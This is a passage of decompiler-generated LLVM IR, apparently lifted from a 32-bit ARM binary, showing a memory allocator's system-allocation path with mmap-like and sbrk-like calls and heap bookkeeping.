  %v2_13fa4 = inttoptr i32 %v1_13fa4 to i32*
  %v3_13fa4 = load i32, i32* %v2_13fa4, align 4
  store i32 %v3_13fa4, i32* %r3.global-to-local, align 4
  %v1_13fa8 = and i32 %v3_13fa4, -4
  store i32 %v1_13fa8, i32* %r2.global-to-local, align 4
  %v0_13fac = load i32, i32* @sl, align 4
  %v2_13fac = sub i32 %v1_13fa8, %v0_13fac
  store i32 %v2_13fac, i32* %ip.global-to-local, align 4
  %v1_13fb0 = add i32 %v3_13f78, 12
  %v2_13fb0 = inttoptr i32 %v1_13fb0 to i32*
  %v3_13fb0 = load i32, i32* %v2_13fb0, align 4
  store i32 %v3_13fb0, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_13fac, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_13fa4
  %v6_13fb8 = add i32 %v1_13fa8, %v3_13f78
  store i32 %v6_13fb8, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_13fa4, %bb143
  %v2_13fbc = add i32 %v3_13fb0, 8
  %v3_13fbc = inttoptr i32 %v2_13fbc to i32*
  store i32 %v0_13fbc, i32* %v3_13fbc, align 4
  %v0_13fc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_13fc0 = load i32, i32* %r0.global-to-local, align 4
  %v2_13fc0 = add i32 %v1_13fc0, 12
  %v3_13fc0 = inttoptr i32 %v2_13fc0 to i32*
  store i32 %v0_13fc0, i32* %v3_13fc0, align 4
  %v4_13fc4 = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_13ea0_crit_edge, label %dec_label_pc_13fd0

.dec_label_pc_13ea0_crit_edge:                    ; preds = %bb144
  %v5_13fc4 = add i32 %v4_13fc4, 8
  store i32 %v5_13fc4, i32* %r4.global-to-local, align 4
  %v4_13fc8 = load i32, i32* %r2.global-to-local, align 4
  %v5_13fc8 = add i32 %v4_13fc8, 4
  %v6_13fc8 = inttoptr i32 %v5_13fc8 to i32*
  %v7_13fc8 = load i32, i32* %v6_13fc8, align 4
  store i32 %v7_13fc8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13ea0

dec_label_pc_13fd0:                               ; preds = %bb144
  %v1_13fd0 = load i32, i32* @sl, align 4
  %v2_13fd0 = add i32 %v1_13fd0, %v4_13fc4
  store i32 %v2_13fd0, i32* %r1.global-to-local, align 4
  %v1_13fd8 = load i32, i32* @r6, align 4
  %v2_13fd8 = add i32 %v1_13fd8, 8
  %v3_13fd8 = inttoptr i32 %v2_13fd8 to i32*
  store i32 %v2_13fd0, i32* %v3_13fd8, align 4
  %v0_13fdc = load i32, i32* %r1.global-to-local, align 4
  %v1_13fdc = load i32, i32* @r6, align 4
  %v2_13fdc = add i32 %v1_13fdc, 12
  %v3_13fdc = inttoptr i32 %v2_13fdc to i32*
  store i32 %v0_13fdc, i32* %v3_13fdc, align 4
  %v0_13fe0 = load i32, i32* @r6, align 4
  %v1_13fe0 = load i32, i32* %r1.global-to-local, align 4
  %v2_13fe0 = add i32 %v1_13fe0, 8
  %v3_13fe0 = inttoptr i32 %v2_13fe0 to i32*
  store i32 %v0_13fe0, i32* %v3_13fe0, align 4
  %v0_13fe4 = load i32, i32* @r6, align 4
  %v1_13fe4 = load i32, i32* %r1.global-to-local, align 4
  %v2_13fe4 = add i32 %v1_13fe4, 12
  %v3_13fe4 = inttoptr i32 %v2_13fe4 to i32*
  store i32 %v0_13fe4, i32* %v3_13fe4, align 4
  %tmp210 = icmp ult i32 %v1_13fd0, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_13fd0
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796), i32* %r2.global-to-local, align 4
  %v8_13ff0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80828) to i32*), align 4
  store i32 %v8_13ff0, i32* %r3.global-to-local, align 4
  %v4_13ff4 = load i32, i32* %r1.global-to-local, align 4
  %v6_13ff4 = add i32 %v8_13ff0, 48
  %v7_13ff4 = inttoptr i32 %v6_13ff4 to i32*
  store i32 %v4_13ff4, i32* %v7_13ff4, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_13fd0, %bb145
  %v0_13ff8 = load i32, i32* @sl, align 4
  %v1_13ff8 = or i32 %v0_13ff8, 1
  store i32 %v1_13ff8, i32* %r2.global-to-local, align 4
  %v0_13ffc = load i32, i32* %ip.global-to-local, align 4
  %v1_13ffc = or i32 %v0_13ffc, 1
  store i32 %v1_13ffc, i32* %r3.global-to-local, align 4
  %v0_14000 = load i32, i32* @lr, align 4
  %v1_14000 = add i32 %v0_14000, 8
  store i32 %v1_14000, i32* %r4.global-to-local, align 4
  %v2_14004 = add i32 %v0_14000, 4
  %v3_14004 = inttoptr i32 %v2_14004 to i32*
  store i32 %v1_13ff8, i32* %v3_14004, align 4
  %v0_14008 = load i32, i32* %ip.global-to-local, align 4
  %v1_14008 = load i32, i32* %r1.global-to-local, align 4
  %v3_14008 = add i32 %v1_14008, %v0_14008
  %v4_14008 = inttoptr i32 %v3_14008 to i32*
  store i32 %v0_14008, i32* %v4_14008, align 4
  %v0_1400c = load i32, i32* %r3.global-to-local, align 4
  %v1_1400c = load i32, i32* %r1.global-to-local, align 4
  %v2_1400c = add i32 %v1_1400c, 4
  %v3_1400c = inttoptr i32 %v2_1400c to i32*
  store i32 %v0_1400c, i32* %v3_1400c, align 4
  br label %dec_label_pc_14460

dec_label_pc_14014.loopexit:                      ; preds = %dec_label_pc_13f34
  br label %dec_label_pc_14014

dec_label_pc_14014:                               ; preds = %dec_label_pc_14014.loopexit, %dec_label_pc_13c28, %dec_label_pc_13c30
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796), i32* %ip.global-to-local, align 4
  %v4_1401c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80828) to i32*), align 4
  store i32 %v4_1401c, i32* @r0, align 4
  %v1_14020 = add i32 %v4_1401c, 44
  %v2_14020 = inttoptr i32 %v1_14020 to i32*
  %v3_14020 = load i32, i32* %v2_14020, align 4
  store i32 %v3_14020, i32* %ip.global-to-local, align 4
  %v1_14024 = add i32 %v3_14020, 4
  %v2_14024 = inttoptr i32 %v1_14024 to i32*
  %v3_14024 = load i32, i32* %v2_14024, align 4
  %v0_14028 = load i32, i32* @sl, align 4
  %v1_14028 = add i32 %v0_14028, 16
  store i32 %v1_14028, i32* %r1.global-to-local, align 4
  %v1_1402c = and i32 %v3_14024, -4
  store i32 %v1_1402c, i32* %r3.global-to-local, align 4
  %v3_14030 = icmp ult i32 %v1_1402c, %v1_14028
  br i1 %v3_14030, label %dec_label_pc_14060, label %dec_label_pc_1403c

dec_label_pc_1403c:                               ; preds = %dec_label_pc_14014
  %v2_1403c = sub i32 %v1_1402c, %v0_14028
  %v2_14040 = add i32 %v0_14028, %v3_14020
  store i32 %v2_14040, i32* %r1.global-to-local, align 4
  %v1_14044 = or i32 %v2_1403c, 1
  store i32 %v1_14044, i32* %r3.global-to-local, align 4
  %v1_14048 = or i32 %v0_14028, 1
  store i32 %v1_14048, i32* %r2.global-to-local, align 4
  %v1_1404c = add i32 %v3_14020, 8
  store i32 %v1_1404c, i32* %r4.global-to-local, align 4
  store i32 %v1_14048, i32* %v2_14024, align 4
  %v0_14054 = load i32, i32* %r1.global-to-local, align 4
  %v1_14054 = load i32, i32* @r0, align 4
  %v2_14054 = add i32 %v1_14054, 44
  %v3_14054 = inttoptr i32 %v2_14054 to i32*
  store i32 %v0_14054, i32* %v3_14054, align 4
  %v0_14058 = load i32, i32* %r3.global-to-local, align 4
  %v1_14058 = load i32, i32* %r1.global-to-local, align 4
  %v2_14058 = add i32 %v1_14058, 4
  %v3_14058 = inttoptr i32 %v2_14058 to i32*
  store i32 %v0_14058, i32* %v3_14058, align 4
  br label %dec_label_pc_14460

dec_label_pc_14060:                               ; preds = %dec_label_pc_14014
  %v1_14060 = inttoptr i32 %v4_1401c to i32*
  %v2_14060 = load i32, i32* %v1_14060, align 4
  store i32 %v2_14060, i32* %r3.global-to-local, align 4
  %v1_14064 = and i32 %v2_14060, 2
  store i32 %v1_14064, i32* %ip.global-to-local, align 4
  %v2_14064 = icmp eq i32 %v1_14064, 0
  %v1_14068 = add i32 %v4_1401c, 860
  %v2_14068 = inttoptr i32 %v1_14068 to i32*
  %v3_14068 = load i32, i32* %v2_14068, align 4
  store i32 %v3_14068, i32* %r1.global-to-local, align 4
  br i1 %v2_14064, label %dec_label_pc_14080, label %dec_label_pc_14070

dec_label_pc_14070:                               ; preds = %dec_label_pc_14060
  %v0_14070 = call i32 @function_14a40()
  %v0_14074 = load i32, i32* @sl, align 4
  %v1_14074 = add i32 %v0_14074, -7
  store i32 %v1_14074, i32* @r0, align 4
  %v0_14078 = call i32 @function_13b88()
  store i32 %v0_14078, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1445c

dec_label_pc_14080:                               ; preds = %dec_label_pc_14060
  %v1_14080 = add i32 %v4_1401c, 844
  %v2_14080 = inttoptr i32 %v1_14080 to i32*
  %v3_14080 = load i32, i32* %v2_14080, align 4
  store i32 %v3_14080, i32* %r3.global-to-local, align 4
  %v3_14084 = icmp ult i32 %v0_14028, %v3_14080
  %v1_14088 = add i32 %v3_14068, -1
  store i32 %v1_14088, i32* %sb.global-to-local, align 4
  br i1 %v3_14084, label %dec_label_pc_1415c, label %dec_label_pc_14090

dec_label_pc_14090:                               ; preds = %dec_label_pc_14080
  %v1_14090 = add i32 %v4_1401c, 852
  %v2_14090 = inttoptr i32 %v1_14090 to i32*
  %v3_14090 = load i32, i32* %v2_14090, align 4
  store i32 %v3_14090, i32* %r2.global-to-local, align 4
  %v1_14094 = add i32 %v4_1401c, 848
  %v2_14094 = inttoptr i32 %v1_14094 to i32*
  %v3_14094 = load i32, i32* %v2_14094, align 4
  store i32 %v3_14094, i32* %r3.global-to-local, align 4
  %v6_1409c = icmp slt i32 %v3_14094, %v3_14090
  br i1 %v6_1409c, label %dec_label_pc_140a0, label %dec_label_pc_1415c

dec_label_pc_140a0:                               ; preds = %dec_label_pc_14090
  %v1_140a0 = add i32 %v0_14028, 10
  %v2_140a4 = add i32 %v1_140a0, %v3_14068
  store i32 %v2_140a4, i32* %r3.global-to-local, align 4
  %v2_140a8 = sub i32 0, %v3_14068
  %v3_140a8 = and i32 %v2_140a4, %v2_140a8
  store i32 %v3_140a8, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_140a8, %v0_14028
  br i1 %tmp211, label %dec_label_pc_140b4, label %dec_label_pc_1415c

dec_label_pc_140b4:                               ; preds = %dec_label_pc_140a0
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_140a8, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_140cc = call i32 @function_15e70(i32 0, i32 %v3_140a8, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_140cc, i32* %r0.global-to-local, align 4
  %v7_140d0 = icmp eq i32 %v6_140cc, -1
  br i1 %v7_140d0, label %dec_label_pc_140b4.dec_label_pc_1415c_crit_edge, label %dec_label_pc_140d8

dec_label_pc_140b4.dec_label_pc_1415c_crit_edge:  ; preds = %dec_label_pc_140b4
  %v1_14180.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_1415c

dec_label_pc_140d8:                               ; preds = %dec_label_pc_140b4
  %v1_140d8 = urem i32 %v6_140cc, 8
  store i32 %v1_140d8, i32* %r2.global-to-local, align 4
  %v2_140d8 = icmp eq i32 %v1_140d8, 0
  br i1 %v2_140d8, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_140d8
  %v2_140dc = sub nsw i32 8, %v1_140d8
  store i32 %v2_140dc, i32* %r3.global-to-local, align 4
  %v2_140e0 = load i32, i32* @r4, align 4
  %v3_140e0 = sub i32 %v2_140e0, %v2_140dc
  %v3_140e4 = add i32 %v2_140dc, %v6_140cc
  store i32 %v3_140e4, i32* %lr.global-to-local, align 4
  %v2_140ec = or i32 %v3_140e0, 2
  store i32 %v2_140ec, i32* %r2.global-to-local, align 4
  %v5_140f4 = inttoptr i32 %v3_140e4 to i32*
  store i32 %v2_140dc, i32* %v5_140f4, align 4
  %v1_140f8 = load i32, i32* %r2.global-to-local, align 4
  %v2_140f8 = load i32, i32* %lr.global-to-local, align 4
  %v3_140f8 = add i32 %v2_140f8, 4
  %v4_140f8 = inttoptr i32 %v3_140f8 to i32*
  store i32 %v1_140f8, i32* %v4_140f8, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_140d8
  store i32 %v6_140cc, i32* %lr.global-to-local, align 4
  %v1_140f047 = load i32, i32* @r4, align 4
  %v2_140f048 = or i32 %v1_140f047, 2
  store i32 %v2_140f048, i32* %r3.global-to-local, align 4
  %v3_140fc = inttoptr i32 %v6_140cc to i32*
  store i32 0, i32* %v3_140fc, align 4
  %v1_14100 = load i32, i32* %r3.global-to-local, align 4
  %v2_14100 = load i32, i32* %lr.global-to-local, align 4
  %v3_14100 = add i32 %v2_14100, 4
  %v4_14100 = inttoptr i32 %v3_14100 to i32*
  store i32 %v1_14100, i32* %v4_14100, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796), i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_1410c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80828) to i32*), align 4
  store i32 %v4_1410c, i32* %ip.global-to-local, align 4
  %v1_14110 = add i32 %v4_1410c, 848
  %v2_14110 = inttoptr i32 %v1_14110 to i32*
  %v3_14110 = load i32, i32* %v2_14110, align 4
  store i32 %v3_14110, i32* %r3.global-to-local, align 4
  %v1_14114 = add i32 %v4_1410c, 856
  %v2_14114 = inttoptr i32 %v1_14114 to i32*
  %v3_14114 = load i32, i32* %v2_14114, align 4
  store i32 %v3_14114, i32* %r2.global-to-local, align 4
  %v1_14118 = add i32 %v3_14110, 1
  store i32 %v1_14118, i32* %r3.global-to-local, align 4
  %v7_14120 = icmp sgt i32 %v1_14118, %v3_14114
  br i1 %v7_14120, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_14118, i32* %v2_14114, align 4
  %v0_14124.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_14124.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_14124 = phi i32 [ %v4_1410c, %.thread27 ], [ %v1_14124.pre, %bb147 ]
  %v0_14124 = phi i32 [ %v1_14118, %.thread27 ], [ %v0_14124.pre, %bb147 ]
  %v2_14124 = add i32 %v1_14124, 848
  %v3_14124 = inttoptr i32 %v2_14124 to i32*
  store i32 %v0_14124, i32* %v3_14124, align 4
  %v0_14128 = load i32, i32* %ip.global-to-local, align 4
  %v1_14128 = add i32 %v0_14128, 868
  %v2_14128 = inttoptr i32 %v1_14128 to i32*
  %v3_14128 = load i32, i32* %v2_14128, align 4
  store i32 %v3_14128, i32* %r3.global-to-local, align 4
  %v1_1412c = add i32 %v0_14128, 880
  %v2_1412c = inttoptr i32 %v1_1412c to i32*
  %v3_1412c = load i32, i32* %v2_1412c, align 4
  store i32 %v3_1412c, i32* %r2.global-to-local, align 4
  %v0_14130 = load i32, i32* @r4, align 4
  %v2_14130 = add i32 %v0_14130, %v3_14128
  store i32 %v2_14130, i32* %r1.global-to-local, align 4
  %v1_14134 = add i32 %v0_14128, 872
  %v2_14134 = inttoptr i32 %v1_14134 to i32*
  %v3_14134 = load i32, i32* %v2_14134, align 4
  store i32 %v3_14134, i32* %r3.global-to-local, align 4
  %v1_1413c = add i32 %v0_14128, 884
  %v2_1413c = inttoptr i32 %v1_1413c to i32*
  %v3_1413c = load i32, i32* %v2_1413c, align 4
  store i32 %v3_1413c, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_14130, %v3_1412c
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_14130, i32* %v2_1412c, align 4
  %v0_14144.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_14144.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_14144 = phi i32 [ %v0_14128, %bb148 ], [ %v1_14144.pre, %bb149 ]
  %v0_14144 = phi i32 [ %v2_14130, %bb148 ], [ %v0_14144.pre, %bb149 ]
  %v2_14144 = add i32 %v1_14144, 868
  %v3_14144 = inttoptr i32 %v2_14144 to i32*
  store i32 %v0_14144, i32* %v3_14144, align 4
  %v0_14148 = load i32, i32* %r1.global-to-local, align 4
  %v1_14148 = load i32, i32* %r3.global-to-local, align 4
  %v2_14148 = add i32 %v1_14148, %v0_14148
  store i32 %v2_14148, i32* %r1.global-to-local, align 4
  %v1_1414c = load i32, i32* %r2.global-to-local, align 4
  %v0_14150 = load i32, i32* %lr.global-to-local, align 4
  %v1_14150 = add i32 %v0_14150, 8
  store i32 %v1_14150, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_14148, %v1_1414c
  br i1 %tmp213, label %bb151, label %dec_label_pc_1445c

bb151:                                            ; preds = %bb150
  %v5_14154 = load i32, i32* %ip.global-to-local, align 4
  %v6_14154 = add i32 %v5_14154, 884
  %v7_14154 = inttoptr i32 %v6_14154 to i32*
  store i32 %v2_14148, i32* %v7_14154, align 4
  br label %dec_label_pc_1445c

dec_label_pc_1415c:                               ; preds = %dec_label_pc_140a0, %dec_label_pc_14080, %dec_label_pc_140b4.dec_label_pc_1415c_crit_edge, %dec_label_pc_14090
  %v1_14180 = phi i32 [ %v1_14180.pre, %dec_label_pc_140b4.dec_label_pc_1415c_crit_edge ], [ %v0_14028, %dec_label_pc_14090 ], [ %v0_14028, %dec_label_pc_14080 ], [ %v0_14028, %dec_label_pc_140a0 ]
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796), i32* %ip.global-to-local, align 4
  %v4_14164 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80828) to i32*), align 4
  store i32 %v4_14164, i32* %r3.global-to-local, align 4
  %v1_14168 = add i32 %v4_14164, 44
  %v2_14168 = inttoptr i32 %v1_14168 to i32*
  %v3_14168 = load i32, i32* %v2_14168, align 4
  store i32 %v3_14168, i32* %r0.global-to-local, align 4
  %v1_1416c = add i32 %v4_14164, 864
  %v2_1416c = inttoptr i32 %v1_1416c to i32*
  %v3_1416c = load i32, i32* %v2_1416c, align 4
  store i32 %v3_1416c, i32* %r2.global-to-local, align 4
  %v1_14170 = add i32 %v4_14164, 840
  %v2_14170 = inttoptr i32 %v1_14170 to i32*
  %v3_14170 = load i32, i32* %v2_14170, align 4
  store i32 %v3_14170, i32* %r3.global-to-local, align 4
  %v1_14174 = add i32 %v3_14168, 4
  %v2_14174 = inttoptr i32 %v1_14174 to i32*
  %v3_14174 = load i32, i32* %v2_14174, align 4
  store i32 %v3_14174, i32* %r1.global-to-local, align 4
  %v1_1417c = urem i32 %v3_1416c, 2
  %v2_1417c = icmp eq i32 %v1_1417c, 0
  %v1_14178 = add i32 %v1_14180, 16
  %v2_14180 = add i32 %v1_14178, %v3_14170
  store i32 %v2_14180, i32* %r3.global-to-local, align 4
  %v1_14184 = and i32 %v3_14174, -4
  store i32 %v1_14184, i32* @r8, align 4
  br i1 %v2_1417c, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_1415c
  %v3_14188 = sub i32 %v2_14180, %v1_14184
  store i32 %v3_14188, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_1415c, %bb152
  %v0_1418c = phi i32 [ %v2_14180, %dec_label_pc_1415c ], [ %v3_14188, %bb152 ]
  %v1_1418c = load i32, i32* %sb.global-to-local, align 4
  %v2_1418c = add i32 %v1_1418c, %v0_1418c
  store i32 %v2_1418c, i32* %r3.global-to-local, align 4
  %v1_14190 = sub i32 -1, %v1_1418c
  store i32 %v1_14190, i32* %fp.global-to-local, align 4
  %v2_14194 = and i32 %v2_1418c, %v1_14190
  store i32 %v2_14194, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_14194, 1
  br i1 %tmp154, label %dec_label_pc_141b8, label %dec_label_pc_141a4

dec_label_pc_141a4:                               ; preds = %bb153
  store i32 %v2_14194, i32* %r0.global-to-local, align 4
  %v1_141a8 = call i32 @function_160fc(i32 %v2_14194)
  store i32 %v1_141a8, i32* %r0.global-to-local, align 4
  %v3_141ac = icmp eq i32 %v1_141a8, -1
  store i32 %v1_141a8, i32* @r4, align 4
  br i1 %v3_141ac, label %dec_label_pc_141b8, label %dec_label_pc_14224

dec_label_pc_141b8:                               ; preds = %dec_label_pc_141a4, %bb153
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796), i32* %r1.global-to-local, align 4
  %v4_141c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80828) to i32*), align 4
  store i32 %v4_141c0, i32* %r6.global-to-local, align 4
  %v1_141c4 = add i32 %v4_141c0, 864
  %v2_141c4 = inttoptr i32 %v1_141c4 to i32*
  %v3_141c4 = load i32, i32* %v2_141c4, align 4
  store i32 %v3_141c4, i32* %r3.global-to-local, align 4
  %v1_141c8 = urem i32 %v3_141c4, 2
  %v2_141c8 = icmp eq i32 %v1_141c8, 0
  br i1 %v2_141c8, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_141b8
  %v1_141cc = load i32, i32* @r8, align 4
  %v2_141cc = load i32, i32* %sb.global-to-local, align 4
  %v3_141cc = add i32 %v2_141cc, %v1_141cc
  %v2_141d0 = load i32, i32* @r5, align 4
  %v3_141d0 = add i32 %v3_141cc, %v2_141d0
  store i32 %v3_141d0, i32* %r3.global-to-local, align 4
  %v2_141d4 = load i32, i32* %fp.global-to-local, align 4
  %v3_141d4 = and i32 %v2_141d4, %v3_141d0
  store i32 %v3_141d4, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_141b8
  %v0_141d8.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_141d8 = phi i32 [ %v0_141d8.pr, %.thread29thread-pre-split ], [ %v3_141d4, %bb155 ]
  %v2_141d8 = icmp ugt i32 %v0_141d8, 1048575
  br i1 %v2_141d8, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_141f0 = phi i32 [ %v0_141d8, %.thread29 ], [ 1048576, %bb156 ]
  %v1_141e0 = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_141f0, %v1_141e0
  br i1 %tmp214, label %dec_label_pc_141e8, label %dec_label_pc_1444c

dec_label_pc_141e8:                               ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_141f0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_14204 = call i32 @function_15e70(i32 0, i32 %v0_141f0, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_14204, i32* %r0.global-to-local, align 4
  %v3_14208 = icmp eq i32 %v6_14204, -1
  %v8_14208 = icmp eq i32 %v6_14204, -1
  store i32 %v6_14204, i32* @r4, align 4
  br i1 %v8_14208, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_141e8
  %v1_14210 = load i32, i32* %r6.global-to-local, align 4
  %v2_14210 = add i32 %v1_14210, 864
  %v3_14210 = inttoptr i32 %v2_14210 to i32*
  %v4_14210 = load i32, i32* %v3_14210, align 4
  %v2_14214 = load i32, i32* @r5, align 4
  %v3_14214 = add i32 %v2_14214, %v6_14204
  store i32 %v3_14214, i32* %r0.global-to-local, align 4
  %v2_14218 = and i32 %v4_14210, -2
  store i32 %v2_14218, i32* %r3.global-to-local, align 4
  store i32 %v2_14218, i32* %v3_14210, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_141e8, %bb158
  br i1 %v3_14208, label %dec_label_pc_14224, label %dec_label_pc_14228

dec_label_pc_14224:                               ; preds = %.thread32, %dec_label_pc_141a4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14228

dec_label_pc_14228:                               ; preds = %.thread32, %dec_label_pc_14224
  %v0_14228 = load i32, i32* @r4, align 4
  %v7_14228 = icmp eq i32 %v0_14228, -1
  br i1 %v7_14228, label %dec_label_pc_1444c, label %dec_label_pc_14230

dec_label_pc_14230:                               ; preds = %dec_label_pc_14228
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796), i32* %r2.global-to-local, align 4
  %v4_14238 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80828) to i32*), align 4
  store i32 %v4_14238, i32* %ip.global-to-local, align 4
  store i32 %v3_14168, i32* %r2.global-to-local, align 4
  %v1_14240 = add i32 %v4_14238, 872
  %v2_14240 = inttoptr i32 %v1_14240 to i32*
  %v3_14240 = load i32, i32* %v2_14240, align 4
  %v1_14244 = load i32, i32* @r8, align 4
  %v2_14244 = add i32 %v1_14244, %v3_14168
  store i32 %v2_14244, i32* %r1.global-to-local, align 4
  %v0_14248 = load i32, i32* @r5, align 4
  %v2_14248 = add i32 %v0_14248, %v3_14240
  store i32 %v2_14248, i32* %r3.global-to-local, align 4
  %v9_1424c = icmp eq i32 %v0_14228, %v2_14244
  br i1 %v9_1424c, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_14230
  store i32 %v2_14248, i32* %v2_14240, align 4
  br label %dec_label_pc_14268

bb159:                                            ; preds = %dec_label_pc_14230
  %v1_14250 = load i32, i32* %r0.global-to-local, align 4
  %v8_14250 = icmp eq i32 %v1_14250, -1
  store i32 %v2_14248, i32* %v2_14240, align 4
  br i1 %v8_14250, label %.thread34, label %dec_label_pc_14268

.thread34:                                        ; preds = %bb159
  %v1_14258 = load i32, i32* @r5, align 4
  %v2_14258 = load i32, i32* @r8, align 4
  %v3_14258 = add i32 %v2_14258, %v1_14258
  %v2_1425c = or i32 %v3_14258, 1
  store i32 %v2_1425c, i32* %r3.global-to-local, align 4
  %v2_14260 = load i32, i32* %r2.global-to-local, align 4
  %v3_14260 = add i32 %v2_14260, 4
  %v4_14260 = inttoptr i32 %v3_14260 to i32*
  store i32 %v2_1425c, i32* %v4_14260, align 4
  br label %dec_label_pc_143e0

dec_label_pc_14268:                               ; preds = %bb159, %.thread122
  %v0_1426c.pr = load i32, i32* @r8, align 4
  %v0_14268 = load i32, i32* %ip.global-to-local, align 4
  %v1_14268 = add i32 %v0_14268, 864
  %v2_14268 = inttoptr i32 %v1_14268 to i32*
  %v3_14268 = load i32, i32* %v2_14268, align 4
  store i32 %v3_14268, i32* %r2.global-to-local, align 4
  %v2_1426c = icmp eq i32 %v0_1426c.pr, 0
  br i1 %v2_1426c, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_14268
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_14268
  %v2_14274 = urem i32 %v3_14268, 2
  store i32 %v2_14274, i32* %r3.global-to-local, align 4
  %v2_14278 = icmp eq i32 %v2_14274, 0
  br i1 %v2_14278, label %.thread40, label %dec_label_pc_14280

dec_label_pc_14280:                               ; preds = %.thread36
  %v0_14280 = load i32, i32* @r4, align 4
  %v1_14280 = load i32, i32* %r1.global-to-local, align 4
  %v3_14280 = icmp ult i32 %v0_14280, %v1_14280
  br i1 %v3_14280, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_14280
  %v2_14284 = and i32 %v3_14268, -2
  store i32 %v2_14284, i32* %r3.global-to-local, align 4
  store i32 %v2_14284, i32* %v2_14268, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_14280, %.thread37, %.thread36, %bb160
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796), i32* %ip.global-to-local, align 4
  %v4_14294 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80828) to i32*), align 4
  store i32 %v4_14294, i32* @r7, align 4
  %v1_14298 = add i32 %v4_14294, 864
  %v2_14298 = inttoptr i32 %v1_14298 to i32*
  %v3_14298 = load i32, i32* %v2_14298, align 4
  store i32 %v3_14298, i32* %r3.global-to-local, align 4
  %v1_1429c = urem i32 %v3_14298, 2
  store i32 %v1_1429c, i32* @r6, align 4
  %v2_1429c = icmp eq i32 %v1_1429c, 0
  br i1 %v2_1429c, label %dec_label_pc_14330, label %dec_label_pc_142a4

dec_label_pc_142a4:                               ; preds = %.thread40
  %v0_142a4 = load i32, i32* @r8, align 4
  %v2_142a4 = icmp eq i32 %v0_142a4, 0
  br i1 %v2_142a4, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_142a4
